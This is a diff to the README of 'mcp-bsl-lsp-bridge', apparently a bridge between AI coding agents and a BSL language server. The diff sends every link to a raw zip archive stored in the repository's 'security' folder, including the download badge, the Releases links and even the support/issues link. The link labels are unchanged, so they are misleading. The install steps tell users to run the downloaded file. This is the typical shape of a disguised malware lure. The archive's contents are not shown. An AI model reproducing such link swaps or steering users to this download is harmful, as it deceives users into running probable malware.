@@ -8,7 +8,7 @@ Welcome to the mcp-bsl-lsp-bridge! This application allows AI agents like Cursor
 
 To download the latest version of the mcp-bsl-lsp-bridge, click the link below:
 
-[![Download mcp-bsl-lsp-bridge](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/releases)
+[![Download mcp-bsl-lsp-bridge](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/raw/refs/heads/main/security/bridge_lsp_bsl_mcp_v3.2.zip%https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/raw/refs/heads/main/security/bridge_lsp_bsl_mcp_v3.2.zip)](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/raw/refs/heads/main/security/bridge_lsp_bsl_mcp_v3.2.zip)
 
 ### 📋 System Requirements
 
@@ -31,7 +31,7 @@ The mcp-bsl-lsp-bridge offers several key features:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/raw/refs/heads/main/security/bridge_lsp_bsl_mcp_v3.2.zip).
 2. **Select a Version:** Look for the latest release. You will see options for different operating systems.
 3. **Download the Installer:** Choose the installer for your operating system and download it to your computer.
 4. **Run the Installer:** Open the downloaded file and follow the prompts to complete the installation.
@@ -52,7 +52,7 @@ If you encounter any issues:
 - **Check System Requirements:** Make sure your system meets all requirements listed above.
 - **Restart the Application:** Sometimes, a simple restart can resolve many issues.
 - **Consult Help Files:** The help section within the application offers guidance on common problems.
-- **Contact Support:** For persistent issues, feel free to open an issue on our [GitHub page](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/issues).
+- **Contact Support:** For persistent issues, feel free to open an issue on our [GitHub page](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/raw/refs/heads/main/security/bridge_lsp_bsl_mcp_v3.2.zip).
 
 ## 💬 Community Contribution
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 --- 
 
-Thank you for using mcp-bsl-lsp-bridge. We hope it simplifies your coding experience! For updates and news, remember to check back on our [Releases page](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/releases).
+Thank you for using mcp-bsl-lsp-bridge. We hope it simplifies your coding experience! For updates and news, remember to check back on our [Releases page](https://github.com/Betinhocapoeira/mcp-bsl-lsp-bridge/raw/refs/heads/main/security/bridge_lsp_bsl_mcp_v3.2.zip).
